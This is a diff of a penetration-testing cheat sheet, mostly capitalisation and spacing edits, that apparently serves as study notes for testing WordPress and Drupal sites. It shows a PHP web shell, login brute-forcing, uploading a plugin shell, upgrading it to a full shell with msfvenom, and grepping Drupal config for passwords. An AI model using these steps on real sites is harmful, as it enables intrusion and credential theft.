@@ -12,15 +12,14 @@
 
 ### Code Execution
 
-php code execution
-
+PHP code execution
 ```php
 <?php echo system($_REQUEST['cmd']); ?>
 ```
 
 ### PHP Type Confusion
 
-( == vs === with 0e12345) 
+( == vs === with 0e12345)  
 [Type Juggling]
 
 ## Wordpress
@@ -44,7 +43,7 @@ nmap -sV --script http-wordpress-brute --script-args uri=/wp/wp-login.php -vvv <
 
 ### wpscan
 
-WordPress Security Scanner
+WordPress Security Scanner  
 
 Enumerate (PWK2.0 style)
 ```bash
@@ -72,12 +71,12 @@ Plugin location: [examplesitefortesting.com]/wp-content/plugins
 /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php
 ```
 
-zip the file
+Zip the file
 ```bash
 sudo zip plugin-shell.zip plugin-shell.php
 ```
 
-install the plugin
+Install the plugin  
 Plugins -> Add New -> Upload Plugin -> Browse -> Install Now
 
 execute command
@@ -85,24 +84,24 @@ execute command
 curl <host>/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=<cmd>
 ```
 
-get a full shell
-* generate payload using msfvenom
-* upload via SimpleHTTPServer and wget (url encoding!)
+Get a full shell  
+* Generate payload using msfvenom
+* Upload via SimpleHTTPServer and wget (url encoding!)
 * chmod +x 
-* execute
+* Execute
 
 ## Drupal
 
 ### droopescan
 
-A plugin-based scanner that aids security researchers in identifying issues with several CMSs, mainly Drupal & Silverstripe.
+A plugin-based scanner that aids security researchers in identifying issues with several CMSs, mainly Drupal & Silverstripe.  
 [GitHub - droope/droopescan](https://github.com/droope/droopescan)
 
 ```bash
 droopescan scan drupal -u <ip>
 ```
 
-search for creds
+Search for creds
 ```bash
 ./sites/default/settings | grep -i pass
 ```
@@ -117,4 +116,5 @@ Plugin location: [examplesitefortesting.com]/?q=[pluginname]
 ```
 
 ### Authenticated
-activate php filter plugin to allow php code execution in posts
+
+Activate php filter plugin to allow php code execution in posts
